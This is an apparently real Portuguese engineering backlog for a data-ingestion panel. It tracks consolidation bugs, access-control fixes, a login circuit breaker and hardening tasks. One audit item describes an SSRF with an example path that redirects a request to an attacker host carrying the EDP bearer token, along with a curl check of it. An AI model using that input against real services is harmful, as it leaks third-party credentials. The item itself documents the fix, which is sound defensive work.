- **Esforço:** fix 2h (feito). Re-consolidação ~10min.
- **Rollback:** Reverter o commit do fix. ⚠️ Reverter **devolve** o auto-reparo
  destrutivo — se precisar reverter, desligue o sweep das 02:00 junto.
- **Depende de:** nada. **Relacionado:** P1-13 (a união que criou a assimetria),
  P1-11 (transação — um crash no meio do reparo ainda zera o dia).
- **31/07/2026:** item 5 resolvido junto com o apply de julho (P1-15) — os dias
  17→24/07 voltaram pra cima (21/07 +6, 24/07 +7, 25/07 +6). E a investigação
  revelou que o fix estava **incompleto**: ver **P0-7**.

---

## P0-7 — Auto-reparo do drift ainda podia SUBTRAIR produção

- **Categoria:** Dados
- **Status:** **done** (31/07/2026)
- **Fonte:** `scripts/verify-consolidacao.js` rodado logo após o apply de julho.
- **Evidência:** 5 dias com drift acima do limiar, **todos negativos** (tabela
  MAIOR que a régua de D+1), e **4 dos 5 são sexta-feira**:

  | dia | tabela | régua D+1 | diff | limiar |
  |---|---|---|---|---|
  | 03/07 (sex) | 888 | 832 | −56 | 17 |
  | 08/07 (qua) | 980 | 958 | −22 | 19 |
  | 10/07 (sex) | 885 | 789 | −96 | 16 |
  | 17/07 (sex) | 1076 | 959 | −117 | 19 |
  | 24/07 (sex) | 959 | 875 | −84 | 18 |

  - **Não é corrupção — é acúmulo legítimo.** `consolidateDay(X)` apaga só
    `{X-1, X}`, mas faz upsert de linhas pra **vários notaDate anteriores** (nota
    concluída na sexta segue no payload das sessões de sábado e segunda). Nos logs
    do apply de 31/07 o passe de 05/07 gravou
    `dates ["2026-07-03","2026-07-04","2026-07-05"]` **sem wipar 03/07**. Logo o
    valor gravado de um dia antigo é mais COMPLETO que o de qualquer passe
    isolado, e a diferença é maior nas sextas — cuja produção continua a aparecer
    no fim de semana e na segunda.
- **Impacto:** o sweep das 02:00 de 31/07 iria "reparar" o 24/07 (dentro da
  janela D-7) e **destruir 84 OS**. Nos 5 dias, **375 OS**. É o P0-6 outra vez,
  um nível mais fundo: lá a régua era D, aqui é D+1 e ainda subconta. Alargar a
  régua indefinidamente não resolve — sempre existe um passe posterior.
- **Ação:**
  1. ✅ `shouldAutoRepair(report)` em `dataWriter.js` — decisão pura: repara só
     quando `diff > 0` (falta produção). Drift negativo → `drift_nao_reparado` +
     `drift_last_skip` em `app_settings`, sem tocar em dado. **Reparo monotônico:
     só ADICIONA, nunca subtrai.**
  2. ✅ `runDriftCheck` consulta a decisão antes de consolidar.
  3. ✅ `POST /api/admin/drift/repair` corrigido — ficou 6 dias com os DOIS
     defeitos que o P0-6 já havia corrigido no cron: rodava `consolidateDay(date)`
     (régua de D) e reparava com drift negativo. Agora usa `repair_date`, respeita
     o guard e exige `?force=1` pra sobrescrever.
  4. ✅ `test/driftRepairGuard.test.js` (8 casos), incluindo os 5 dias reais e a
     soma de 375 OS que o sweep destruiria.
- **Aceite:**
  - [x] `node --test` 336 → 343 verdes.
  - [ ] Log do sweep de 01/08 às 02:00: `drift_nao_reparado` nesses dias, e
        `verify-consolidacao.js` mostrando os mesmos números do dia anterior.
- **Esforço:** 1h (feito).
- **Rollback:** reverter o commit. ⚠️ Devolve o reparo destrutivo.
- **✅ CAUSA-RAIZ ENCONTRADA no mesmo dia: era o P1-16.** A hipótese de "acúmulo
  legítimo" estava ERRADA — o que a tabela tinha a mais era **nota rejeitada
  re-somada** pelos passes dos dias seguintes (a exclusão casava pelo dia da
  SESSÃO, não da NOTA). Depois do fix do P1-16 + re-consolidação de julho, as
  quatro sextas passaram de −56 / −96 / −117 / −84 para **+2 / +3 / +2 / +4**, e
  os 31 dias ficaram `ok`. A régua de D+1 SEMPRE foi suficiente; o problema era o
  dado. **Não há necessidade de alargar a régua pra D+1..D+3.**
  - O guard continua valendo como rede de segurança — um reparo automático que
    pode subtrair é perigoso independentemente desta causa específica.

---

## P0-8 — `note_rejections` tem PK = `note_id`: a regra que reportamos à EDP não é representável no schema

- **Categoria:** Dados
- **Status:** **REBAIXADO A P1 em 21/08/2026** — a premissa que sustentava o P0 foi
  REFUTADA pela medição. Mecanismo residual (dia que sobrevive) em 2ª medição.

### MEDIÇÃO 21/08/2026 — eu errei a severidade, e o dado mostra onde

`scripts/diag-rejeicoes-multiplas.js`, janela 01/06 → 21/08/2026:

```
pares (nota, equipe, dia) em notasRejeitadas: 19.968
notas distintas com rejeição:                 19.573
notas rejeitadas por 2+ EQUIPES distintas:         0   ← a hipótese do P0
notas rejeitadas em 2+ DIAS distintos:           395
  dessas, também concluídas:                     315
  com rejeição de equipe ≠ da que concluiu:        0
presentes em note_rejections:                395/395, todas com 1 linha
```

**O caso que eu usei para justificar o P0 não acontece.** Eu escrevi que a regra
de 31/07/2026 fala literalmente de "equipe A rejeita → reprogramada → equipe B
conclui" e que o schema não representa isso. As duas afirmações são verdadeiras,
mas eu tratei "não é representável" como "está acontecendo": em 19.573 notas
rejeitadas ao longo de quase 3 meses, **zero** foram rejeitadas por duas equipes.
A rejeição, na prática, nunca troca de equipe. Então a PK não estava apagando
produção de ninguém — não havia nada para apagar.

**O que a medição achou no lugar, e que continua valendo:** 395 notas rejeitadas
em DOIS dias, sempre pela MESMA equipe, e concentradas em pares de dias colados
(08→09/07 e 23→24/06 aparecem repetidamente, em equipes de GUA, CAC e SJC ao
mesmo tempo). Concentração por par-de-datas e não por equipe sugere **arrasto da
mesma rejeição entre dois snapshots** (a nota permanece no payload), não uma
segunda recusa. A 2ª medição confirma ou refuta isso.

**O mecanismo residual — real, verificado, ainda não quantificado:**
`_contaComoExecutada(dias, notaDate)` só devolve "não é produção" se ALGUM dia de
rejeição for >= o dia da nota. Com a PK colapsando, sobra um dia só. Se o que
sobrou é o mais ANTIGO e a conclusão caiu depois dele, a regra passa a ver
"rejeição antes da conclusão" e conta como produção:

```
rejeições reais 08/07 e 09/07, conclusão 09/07:
  com os dois dias        → produção? false   (correto)
  só 08/07 sobrevivendo   → produção? true    (errado)
  só 09/07 sobrevivendo   → produção? false   (correto)
```

Ou seja: o impacto depende de QUAL dia a última gravação deixou na tabela.
`scripts/diag-rejeicoes-datas.js` (21/08) simula os dois cenários com as funções
reais do `dataWriter` e conta em quantas notas o resultado difere. Se der 0, a
migração é preventiva e entra sem re-consolidar; se der >0, é corretiva.

### 2ª MEDIÇÃO 21/08/2026 — FECHADO como não-problema, e a correção que eu propus seria PIOR

`scripts/diag-rejeicoes-datas.js`, mesma janela:

```
notas rejeitadas em 2+ dias:      395
  pares de dias CONSECUTIVOS:     395/395   ← 100%
  sem linha em note_rejections:     0
  sem conclusão na janela:         80
  regra dá o MESMO resultado:     313
  regra dá resultado DIFERENTE:     2
```

**2 notas em 19.573.** E as duas são artefato da minha simulação, não bug:
`_rejIndexByNote` usa `rejection_date` — o **RejectedAt da WPA** —, e o comentário
que está no código desde o P1-16 já explicava por quê:
*"session_date é o dia em que o coletor VIU a rejeição, que pode ser posterior ao
fato"* (`services/dataWriter.js:256-259`). Minha simulação alimentou a regra com
dias de `snapshots.date`, que é exatamente essa grandeza que o código descarta de
propósito. Com 395/395 em dias colados, o 2º dia é **arrasto da mesma rejeição**
(a nota permanece no payload do dia seguinte), não uma segunda recusa.

**Consequência importante:** a PK composta `(note_id, team_name, rejection_date)`
que eu propus **degradaria** o sistema — passaria a gravar uma linha por
*dia-em-que-vimos*, reinjetando na regra os dias fantasma que o design atual
filtra. Ou seja: o "conserto" reintroduziria o problema que o P1-16 resolveu.
A PK de uma linha por nota, com a data autoritativa, é a escolha certa.

**O que sobra, e é o único risco real** (virou P2-32): linhas em que
`rejection_date` é NULL caem no `session_date` e aí herdam o dia do arrasto. Nessas
o erro é o INVERSO do que eu supus — rejeição empurrada para frente **suprime**
produção legítima. É medível pela seção 6 do script (cobertura de RejectedAt por
tipo) e casa com o P1-24/P1-33: os tipos sem endpoint de rejeição (DL/LE/RL) são
justamente os que não têm data autoritativa. O conserto é obter o RejectedAt,
não mexer em chave.

**Lição pro próximo que ler isto:** eu abri este item como P0 com evidência de
schema correta e premissa de comportamento não verificada. As duas medições que o
próprio item pedia como ação nº 1 derrubaram a classificação e a solução. Medir
antes de migrar não foi burocracia — foi o que evitou uma regressão.
**Ação revisada:**
  1. ✅ rodar `scripts/diag-rejeicoes-datas.js` na VM — feito 21/08, resultado acima;
  2. ✅ decidido: **nenhuma das duas.** PK composta seria regressão; e "dia mais
     recente" também está errado quando o dia vem do arrasto. O que fica é o
     P2-32 (cobrir o `rejection_date` NULL), dependente do P1-33.
  3. ✅ re-consolidação NÃO necessária — 2 notas em 19.573, ambas artefato.

- **Origem:** revisão paralela por agentes, 20/08/2026 (5 análises dos scripts
  Python do outro projeto). Conferido linha a linha antes de registrar.
- **Evidência:**
  - `db/schema-atual.sql:518` — `ADD CONSTRAINT note_rejections_pkey PRIMARY KEY (note_id)`
    (idem `supabase/migrations/008_note_rejections.sql`). `team_name`,
    `session_date` e `rejection_date` são **atributos**, não chave.
  - `services/cronService.js:685` — `upsert(chunk, { onConflict: 'note_id' })`:
    a segunda rejeição da mesma nota **sobrescreve** a primeira.
  - `services/dataWriter.js:263-275` — `_rejIndexByNote` monta chave
    `note_id|team_name → [dias]`, isto é, foi escrito assumindo que uma nota
    pode ter rejeições de **várias** equipes. A tabela só entrega a última.
- **Impacto:** a regra vigente (decisão do dono do produto, 31/07/2026) fala
  literalmente do caso *"equipe A rejeita → nota reprogramada → equipe B conclui
  100%"*. Esse caso **não cabe na tabela**. Cenário concreto: nota rejeitada pela
  ECTSJ80 em 03/07 e pela ECTSJ85 em 10/07 → sobra uma linha (a de 10/07) →
  `_contaComoExecutada` não vê a rejeição da ECTSJ80 → **a nota volta a contar
  como produção dela**. É a mesma família do P0-7, por perda de linha em vez de
  chave que não casa. O total de rejeições também subconta 1 por nota com 2+
  visitas rejeitadas.
- **Por que é P0:** enfraquece silenciosamente o P1-16/P0-7, que foram fechados
  esta semana e cujo resultado (julho −934, junho +682) já foi conferido. Não
  sabemos o volume: **a própria PK impede contar por SQL** — para medir é preciso
  varrer `snapshots` (retenção ilimitada, então é possível).
- **Ação:**
  1. ⬜ medir primeiro: script que varre `snapshots` e conta notas com rejeições
     de 2+ equipes ou em 2+ dias (sem tocar o banco de produção).
  2. ⬜ migração aditiva: PK composta `(note_id, team_name, rejection_date)`,
     ou `(note_id, interruption_id)` usando o `Id` que o
     `/Notes/{id}/completeInterruptions` devolve (ver P1-33).
  3. ⬜ backfill a partir dos snapshots (as linhas sobrescritas estão perdidas
     na tabela, mas são reconstruíveis).
  4. ⬜ re-consolidar os meses afetados só depois de medir o delta em dry-run.
- **Critério de aceite:** existe nota com 2 equipes distintas e 2 linhas em
  `note_rejections`; `_rejIndexByNote` devolve 2 entradas para ela; teste novo
  cobre "A rejeita em D1, B conclui em D2" e "A rejeita em D1, A conclui em D3".
- **Esforço:** medição 1h · migração + backfill 4-6h · re-consolidação 2h.
- **Rollback:** a migração é aditiva (PK mais larga aceita tudo que a antiga
  aceitava). Reverter = restaurar a PK antiga após dedup por `note_id`.
- **Relacionado:** P0-7, P1-15, P1-16, P1-24, P1-33, P2-13.

---

# P1 — Alta prioridade (4 semanas)

## P1-18 — `/settings/:key` sem guarda de dono/role (escalonamento + IDOR)

- **Categoria:** Segurança (controle de acesso)
- **Status:** **done** (13/08/2026)
- **Fonte:** investigação da persistência de filtros, disparada por um susto do
  admin não ver outras regionais na Histórico (que era o **P1-19**, não este).
- **Evidência:** `GET`/`PUT /api/settings/:key` (`routes/index.js`) só passavam por
  `authMiddleware` — sem checar dono nem role. `app_settings` é COMPARTILHADA e
  guarda estado operacional que tem rotas dedicadas protegidas:
  - `metas_diarias` — a rota dedicada valida regional por conta (não-admin só
    escreve a própria); a genérica deixava **qualquer conta sobrescrever as metas
    de todas as regionais**.
  - `contador-transgressao` e `desloc-threshold` — `requireAdmin` nas dedicadas,
    reabertos sem guarda.
  - `snapshot_last_ok` / `snapshot_error` / `subcat_error` / `drift_last_*` —
    escritos só pelo cron; qualquer conta podia forjar "cron saudável" e cegar o
    watchdog.
  - `monitor-filters:<outro-user>` — IDOR: ler ou sobrescrever o filtro alheio.
  - **Não** era vazamento de dado operacional (o `applyScope` das rotas de dados
    seguia firme) — era escrita indevida em estado de configuração + IDOR.
- **Fix:** a rota passa a servir SÓ a preferência do próprio usuário —
  `monitor-filters:<username-do-token>`. Qualquer outra chave → `403`
  (`code: SETTINGS_SCOPE`). Helpers `_ownSettingsKey` / `_assertOwnSettingsKey`.
  O front nunca usou outra chave (confirmado: só `_filtersKey()`), então não
  quebra nada. Estado operacional continua só nas rotas dedicadas.
- **Teste:** `test/settingsScope.test.js` (9 casos) — própria chave passa, chave
  de outro user 403, metas/cron/contador 403 até pra admin, sem-token 401.
  Suíte 357 → 366.
- **Aceite:** [x] testes verdes · [ ] após deploy, tentar `PUT
  /api/settings/metas_diarias` com token não-admin e ver 403.
- **Esforço:** 1h (feito). **Rollback:** reverter o commit (reabre o buraco).
- **Relacionado:** P0-4, P1-12 (mesma família de controle de acesso), P1-19.

## P1-19 — Aba Histórico travava a regional pra admin

- **Categoria:** Frontend (correção; NÃO é vazamento)
- **Status:** **done** (13/08/2026, commit 5e2c17a)
- **Sintoma:** admin (3 regionais) só via Guarapari na Histórico; nas outras abas
  via todas. Gerou dúvida sobre acesso das outras contas — daí a investigação que
  achou o **P1-18**.
- **Causa:** a trava da regional na init lazy da Histórico testava
  `currentRegional` (o FILTRO corrente, mutável) em vez de `userRegionals` (o
  ESCOPO do JWT, imutável). Sequência: admin com Guarapari selecionado noutra aba
  → `currentRegional='GUA'` → 1ª abertura da Histórico dispara a trava e
  DESABILITA o dropdown; a init roda 1x e o `setDisabled(true)` nunca era desfeito.
  A Gráficos nunca sofreu porque testava `sess.regional`, ausente no token v2.
- **Fix:** travar só quando `userRegionals.length === 1` (conta de 1 regional).
  Multi-regional com subconjunto selecionado: reflete a seleção, mas DESTRAVADO.
  Verificado nos 6 perfis (admin todas/1/2, user GUA, user ES todas/subset).
- **Segurança:** nenhuma — o backend enforce escopo por conta, e o bug
  restringia (mostrava MENOS), o oposto de vazar.
- **Esforço:** 30min (feito). **Relacionado:** P1-18 (achado na mesma trilha).

---

## P1-20 — Login WPA sem circuit breaker trava a conta na EDP

- **Categoria:** Ops / Backend (continuidade da ingestão)
- **Status:** **código done** (13/08/2026) — falta só o deploy e a ação humana da senha
- **Incidente (13/08/2026):** entre 17:45 e 18:00 a senha da conta WPA `sp` parou
  de ser aceita ("Usuário ou senha inválidos" — a EDP rotacionou a senha). O
  sistema seguiu pedindo token a cada trigger (snapshot 15/15min + notas + teams);
  **cada um faz 1 login real** e, em 5 tentativas, a EDP **bloqueou a conta até
  03:30**. Coleta parada das 18h até intervenção.
- **Diagnóstico:** o `login()` (`services/wpaService.js:202`) já NÃO faz retry em
  credencial inválida (só em erro transiente de rede/Azure) — então não são 5
  tentativas numa chamada. As 5 vêm de **chamadores independentes** que não
  compartilham o conhecimento "o último login falhou por senha". Cada um reaprende
  do zero e gasta uma tentativa do orçamento da EDP.
- **✅ IMPLEMENTADO (13/08/2026) — breaker por conta em `login()`** (`services/
  wpaService.js`; `login()` é o choke point de `getToken`, `forceRefresh` e o cron
  de token, então cobre tudo):
  - `_classifyLoginError(msg)` — `invalid_credential` / `account_locked` / `other`.
  - `_computeUnlockUntil(msg, nowMs)` — parseia "aguarde até HH:MM" e devolve a
    PRÓXIMA ocorrência em BRT (+2min de margem). Puro, `nowMs` injetável.
  - `_breaker` (Map por conta) com `until`; `login()` no topo rejeita sem tocar no
    `/signin` enquanto vigente (`err.isBreakerOpen`).
  - cooldown: `account_locked` → até o horário do desbloqueio; `invalid_credential`
    → longo (12h, `WPA_INVALID_CRED_COOLDOWN_MIN`) porque não se cura sozinho — só
    troca de `.env` + restart, e o restart zera o breaker (é em memória).
  - reseta em: login OK (`_clearBreaker`), restart, ou fim do `until`.
  - erro transiente (rede/Azure cold-start) **não** abre o breaker — o retry curto
    do cold-start segue funcionando.
  - `test/loginBreaker.test.js` (13 casos): classificação, parse do horário
    (18:30→03:32 e "já passou→amanhã"), abrir/expirar, isolamento por conta, e
    `login()` rejeitando sem rede. Suíte 366 → 379.
- **Efeito:** senha errada continua parando a coleta (inevitável), mas a conta
  **não trava** → corrigir `.env` + `pm2 restart` recupera na hora, sem esperar a
  janela de bloqueio da EDP.
- **Ação humana (fora do código):** quando a EDP rotacionar a senha, atualizar o
  `.env` (`SP_PASS`/equivalente) ANTES do próximo ciclo e reiniciar. ⚠️ Se o `.env`
  seguir errado após o desbloqueio, re-trava na 1ª rodada.
- **Relacionado:** P1-1 (watchdog — deveria ter alertado o bloqueio em tempo real),
  P1-3 (`snapshot_last_ok`/`snapshot_error` já registram, mas ninguém é avisado).
- **Esforço:** ~2-3h com testes.

---

## P1-1 — Alerta ativo (watchdog + Teams webhook)

- **Categoria:** Operação
- **Status:** pending
- **Fonte:** Auditoria de operação 2026-07-08 (já ocorreu incidente de 3h
  sem detecção).
- **Evidência:** Grep por `alert|smtp|nodemailer|notify|watchdog` em
  `services/`: zero resultados. `/api/admin/health` expõe `last_snapshot.ageMinutes`
  mas nada o consome automaticamente.
- **Impacto:** Cron parou 3h uma vez sem ninguém saber. Cada janela de
  ~15min sem coleta = buraco permanente no histórico.
- **Ação:**
  1. Criar Incoming Webhook no Teams (canal operacional da Engelmig ou
     canal privado do José pra começar).
  2. Escrever `scripts/watchdog.sh` (~30 linhas): `curl` no
     `/api/admin/health`, se `ageMinutes > 45` na janela 06-20h BRT ou HTTP
     != 200, `curl` no webhook Teams com payload de alerta.
  3. Adicionar ao `crontab -e` do `usr_jose`: `*/15 * * * * ~/prod-stc/scripts/watchdog.sh`.
- **Aceite:**
  - [ ] Webhook Teams recebe teste manual (curl com payload dummy).
  - [ ] `watchdog.sh` roda sem erro e não alerta se sistema saudável.
  - [ ] Simulação: parar PM2 por 50min em horário útil → alerta chega
    no Teams em até 15min.
  - [ ] Documentado no `RUNBOOK.md`.
- **Esforço:** meio dia.
- **Rollback:** `crontab -r` remove o watchdog. Sem efeito no sistema.
- **Depende de:** P1-2 (`/health` real).

## P1-2 — `/health` real (mover antes do catch-all + SELECT 1)

- **Categoria:** Operação
- **Status:** pending
- **Fonte:** Auditoria de operação + backend 2026-07-08
- **Evidência:** `server.js:75-78` registra `app.get('*')` que responde
  `index.html` pra qualquer path não-`/api`. `server.js:79` registra
  `app.get('/health')` **depois** — Express casa por ordem, então `/health`
  devolve HTML 200 sempre. Nunca o JSON esperado.
- **Impacto:** Qualquer monitor externo (P1-1, uptime check) que aponte
  pra `/health` sempre vê 200, mesmo com Postgres caído ou cron morto.
  Monitoria vira placebo.
- **Ação:**
  1. Mover `app.get('/health')` pra **antes** do `express.static` e do
     `app.get('*')`.
  2. Fazer o handler executar `SELECT 1` no pool + ler idade do último
     snapshot em `snapshots` (max(captured_at)).
  3. Retornar 503 se: SELECT 1 falhar OU `ageMinutes > 30` em horário 06-20h.
     Retornar 200 com JSON `{ok:true, db:'ok', last_snapshot_min: N}`
     caso contrário.
- **Aceite:**
  - [ ] `curl -sS http://localhost:3002/health` retorna JSON válido, não HTML.
  - [ ] Com Postgres parado (`pg_ctl stop` ou docker stop), retorna 503.
  - [ ] Documentado em `RUNBOOK.md`.
- **Esforço:** 30min.
- **Rollback:** Trivial (reverter ordem).
- **Depende de:** nada.

## P1-3 — `snapshot_last_ok` em `app_settings`

- **Categoria:** Operação
- **Status:** pending
- **Fonte:** Auditoria de pipeline 2026-07-08
- **Evidência:** `services/cronService.js:170-171` — snapshot_failed só vira
  `log.error`, sem persistência. Só `subcat_error` tem registro em
  `app_settings` (linhas 33-49). Queda da WPA por horas é invisível.
- **Impacto:** `/admin/health` (que alimenta o P1-1) precisa saber quando
  foi o último snapshot bem-sucedido. Hoje calcula da tabela `snapshots`,
  o que é frágil (pode não representar tentativa que falhou).
- **Ação:**
  1. Replicar padrão `_recordSubcatError` (`cronService.js:33-49`) em novas
     funções `_recordSnapshotOk()` e `_recordSnapshotError()`.
  2. Chamar `_recordSnapshotOk()` ao final de `runSnapshot` bem-sucedido
     (grava timestamp).
  3. Chamar `_recordSnapshotError({at, msg})` em cada catch de `runSnapshot`.
  4. Expor em `/api/admin/health` (`routes/index.js:1242`) os campos
     `snapshot.last_ok` e `snapshot.last_error`.
- **Aceite:**
  - [ ] `SELECT data FROM app_settings WHERE key='snapshot_last_ok'` retorna
    JSON válido com `ts` recente.
  - [ ] `/api/admin/health` retorna esses campos.
  - [ ] Card no frontend Admin exibe (replicar padrão do card de
    `subcat_error` em `index.html:11754`).
- **Esforço:** 2-3h.
- **Rollback:** Trivial (funções novas não interferem em nada existente).
- **Depende de:** nada.

## P1-4 — SSRF em `/api/wpa/probe` vaza token EDP

- **Categoria:** Segurança
- **Status:** pending
- **Fonte:** Auditoria de segurança 2026-07-08
- **Evidência:** `routes/index.js:905-908` — `const path = req.query.path || ...; const wpaRes = await wpaFetch(path);`
  sem validação. `services/wpaService.js:340-347` — `wpaFetch` faz
  `fetch(WPA_API + path, { Authorization: 'Bearer ' + token })`.
  Concatenação de string permite `?path=.attacker.com/` → destino vira
  `https://edp-wpa-web-api.azurewebsites.net.attacker.com/` com Bearer
  token da EDP anexado.
- **Impacto:** Qualquer usuário autenticado (dos 5) pode exfiltrar o token
  da EDP pra host controlado. Combinado com brute force de login (P1-5),
  qualquer atacante interno pode fazer isso. Token EDP é credencial de
  terceiro — vazamento pode encerrar contrato.
- **Ação:**
  1. Em `routes/index.js:905`, adicionar validação:
     ```js
     const path = req.query.path || '';
     if (!/^\/api\/[a-zA-Z0-9/_?=&%,-]*$/.test(path)) {
       return res.status(400).json({ error: 'path inválido' });
     }
     ```
  2. Aplicar mesma validação nas rotas `/api/debug/*` que repassam
     `sectorId` cru (linhas 925-1213).
  3. Considerar isolar todas as rotas de debug atrás de env `DEBUG_ROUTES=1`
     (não montar em produção).
- **Aceite:**
  - [ ] Teste manual: `curl "/api/wpa/probe?path=.attacker.com/"` retorna 400.
  - [ ] Teste manual: `curl "/api/wpa/probe?path=/api/teamsstatus/V2"` continua
    funcionando (200 com dados da EDP).
  - [ ] Grep confirma que nenhuma outra rota concatena `req.query.*` em
    URL sem validação: `grep -n "wpaFetch(.*req\.query" routes/`
- **Esforço:** 30min-1h.
- **Rollback:** Reverter o commit. Vulnerabilidade volta.
- **Depende de:** nada.

## P1-5 — Rate limit em `/auth/login` + scrypt

- **Categoria:** Segurança
- **Status:** CÓDIGO done (fa62e12, 08/07) — **falta só a migração operacional do
  `.env` de produção** (passo 6 abaixo). Rate limit, scrypt, compat retroativa e
  o script `rehash-users.js` já estão no ar. Enquanto o `.env` não migra, a
  produção segue em SHA-256 legado (login funciona pelos dois formatos; o boot
  loga o aviso `AUTH_USERS usa hash SHA-256 legado`). Verificado em 14/07: os 4
  testes de login/rate-limit passam (test/routes.test.js), incluindo o 429 na
  11ª tentativa.
- **Fonte:** Auditoria de segurança 2026-07-08
- **Evidência:** `routes/index.js:34-51` rota de login sem limitador.
  `server.js:15-18` nenhum middleware de rate limit. `middleware/auth.js:97-108`
  usa `sha256` puro sem salt.
- **Impacto:** Painel escuta em todas as interfaces (`server.js:91` sem
  host). Rede 172.25.x tem qualquer máquina alcançando `/auth/login` sem
  throttle. 5 contas, brute force ilimitado. Se `AUTH_USERS` vazar por
  qualquer canal, SHA-256 sem salt cai em segundos com rainbow table.
- **Ação:**
  1. Adicionar limitador em memória em `routes/index.js:34`:
     `const _loginAttempts = new Map();` — chave `${ip}:${username}`,
     valor `{count, firstAt}`. Regra: >10 tentativas em 5min → 429 com
     `Retry-After: 300`.
  2. **Trocar `sha256` por `scrypt`** em `middleware/auth.js:97-108`. `scrypt`
     é nativo em `crypto` (sem dependência nova). Salt por usuário.
  3. Formato novo do `AUTH_USERS`:
     `user:scrypt$salt$hash:role:regional1|regional2` (novo prefixo `scrypt$`
     no campo hash).
  4. Manter compat retroativa por 1 release: se hash começa com `scrypt$`,
     valida com scrypt; caso contrário, tenta SHA-256 (legacy). Logar
     warning quando cair no legacy.
  5. Script `scripts/rehash-users.js` que lê AUTH_USERS atual e imprime
     versão com scrypt (dev roda uma vez, cola no .env).
  6. **[PENDENTE — único passo que falta]** Migrar o `.env` de produção na VM:
     precisa das senhas em texto (estão no cofre — ver P0-1). Procedimento:
     `cd ~/prod-stc && node scripts/rehash-users.js` (modo interativo pergunta
     a senha de cada user e imprime a linha `AUTH_USERS=` em scrypt) → colar no
     `.env` → `pm2 delete wpa-monitor && pm2 start ecosystem.config.js &&
     pm2 save` → testar login de sjc/guarapari/cachoeiro/admin. Guardar backup
     da linha antiga antes (rollback = colar de volta; SHA-256 ainda valida).
- **Aceite:**
  - [x] 11 tentativas de login errado no mesmo user em 1min retornam 429.
  - [x] Login válido continua funcionando.
  - [x] Novo formato scrypt validado em `test/auth.test.js`.
  - [x] Compat retroativa: hash SHA-256 antigo ainda valida com warn.
  - [ ] `.env` da produção migrado pro formato novo. **← só isto falta**
- **Esforço:** meio dia (código feito; resta ~15min de migração operacional).
- **Rollback:** Reverter o commit. `.env` volta ao formato antigo (guardar
  backup do `.env` no cofre P0-1 antes de mudar).
- **Depende de:** P0-1 (cofre pra backup do `.env`).

## P1-6 — Git hook `pre-push` roda `node --test`

- **Categoria:** Qualidade
- **Status:** pending
- **Fonte:** Auditoria de qualidade 2026-07-08 (suíte quebrada 4 semanas
  sem ninguém notar).
- **Evidência:** `.github/` não existe (sem CI). `package.json:10` só tem
  `"test": "node --test"`. Ninguém força a rodar.
- **Impacto:** Suíte de 152 testes é rede de segurança inútil se ficar
  vermelha sem alerta. Já aconteceu em 2026.
- **Ação:**
  1. Criar `.git/hooks/pre-push` (script bash):
     ```bash
     #!/bin/bash
     echo "🧪 Rodando node --test antes do push..."
     if ! node --test; then
       echo "❌ Testes falharam. Push abortado. Corrija ou use 'git push --no-verify'."
       exit 1
     fi
     ```
  2. `chmod +x .git/hooks/pre-push`.
  3. Como hooks locais não são versionados por padrão, adicionar
     `scripts/install-hooks.sh` que copia de `hooks/pre-push` (versionado)
     pra `.git/hooks/pre-push`. Documentar em CLAUDE.md que novo dev roda
     esse script após clone.
- **Aceite:**
  - [ ] `hooks/pre-push` existe no repo (versionado).
  - [ ] `scripts/install-hooks.sh` instala corretamente.
  - [ ] Simulação: `git push` com teste quebrado → aborta com mensagem.
  - [ ] Documentado em `CLAUDE.md`.
- **Esforço:** 30min.
- **Rollback:** `rm .git/hooks/pre-push` — desliga sem afetar mais nada.
- **Depende de:** nada.

## P1-7 — Retry natural pra MD/SF/rejeições

- **Categoria:** Dados / Pipeline
- **Status:** pending
- **Fonte:** Auditoria de pipeline 2026-07-08
- **Evidência:**
  - `services/classifierService.js:40-46` — `safeJson` engole erro e retorna
    `null`. `:89-96` — `md=null` → grava `OUTROS` no cache.
  - `services/rejectionService.js:226-233` — `all_failed` retorna struct
    com `motivo_codes=[]` em vez de null. `services/cronService.js:439-445`
    — filtro `jaCacheadas` nunca retenta note_id já gravado.
- **Impacto:** Erro transiente da WPA (timeout, cold-start Azure) vira
  classificação errada **permanente**. Só DD tem retry (`cronService.js:642`).
  MD/SF/rejeições degradam KPIs de subcategoria a cada instabilidade EDP.
- **Ação:**
  1. Em `classifierService.js:classificarMD` e `classificarSF`: quando
     `md/sf === null` (distinto de "respondeu sem Code"), retornar `null`
     em vez do struct com sub_code='OUTROS'.
  2. No caller (`upsertSubcatTotals` em `dataWriter.js`), pular UUIDs
     com `null` — não adicionar ao cache. Próximo ciclo pega de graça
     porque `note_id` continua fora de `getClassifiedIds`.
  3. Em `rejectionService.js:runClassifyRejections`, não gravar linhas com
     `endpoint_missing` ou `all_failed=true`. Retornar `null` do processor,
     caller pula.
  4. Adicionar métrica no `/admin/health`: contador de UUIDs pendentes
     (não classificados) — se crescer descontroladamente, alerta.
- **Aceite:**
  - [ ] Simulação: mockar `wpaFetch` retornando erro por 1 ciclo. UUIDs
    daquele ciclo NÃO devem entrar em `note_subcategorias`.
  - [ ] Ciclo seguinte com WPA respondendo normalmente: UUIDs pegos e
    classificados corretamente.
  - [ ] `/admin/health` mostra contador de pendentes.
- **Esforço:** 3-4h.
- **Rollback:** Reverter o commit. Volta ao comportamento anterior.
- **Depende de:** nada.

## P1-8 — `consolidateDay` transacional (parte de P0-3)

Ver P0-3. Este item é a parte de refactor de código do fix — pode ser
feita em PR separado depois dos testes.

## P1-9 — Vendorizar Leaflet + fonte Roboto

- **Categoria:** Frontend
- **Status:** pending
- **Fonte:** Auditoria de frontend 2026-07-08
- **Evidência:** `index.html:16-19` — `unpkg.com/leaflet@1.9.4` e
  `leaflet-polylinedecorator`. `index.html:8-9` — `fonts.googleapis.com`.
  Enquanto o comentário em `index.html:10-13` documenta que
  `cdn.sheetjs.com` foi bloqueado pelo Fortinet e quebrou tudo.
- **Impacto:** Próxima política restritiva do Fortinet mata as abas Mapa
  e Deslocamentos com `L is not defined`. Sem deploy, sem aviso, sem forma
  de diagnóstico até alguém abrir F12.
- **Ação:**
  1. `curl` os arquivos pra `vendor/`:
     - `vendor/leaflet-1.9.4.js`
     - `vendor/leaflet-1.9.4.css`
     - `vendor/leaflet-images/` (marker icons)
     - `vendor/leaflet-polylinedecorator.js`
     - `vendor/roboto/*.woff2` (weights 400/500/700)
  2. Atualizar `<link>` e `<script>` em `index.html` pra apontar pra
     `vendor/`.
  3. Adicionar `@font-face` em CSS pra Roboto local.
  4. Testar aba Mapa e Deslocamentos em produção com Fortinet ativo.
- **Aceite:**
  - [ ] Sem requests pra `unpkg.com` ou `fonts.googleapis.com` (F12 → Network).
  - [ ] Mapa desenha, rota traça, marcadores aparecem.
  - [ ] Fonte Roboto carrega (visualmente indistinguível).
- **Esforço:** 1h.
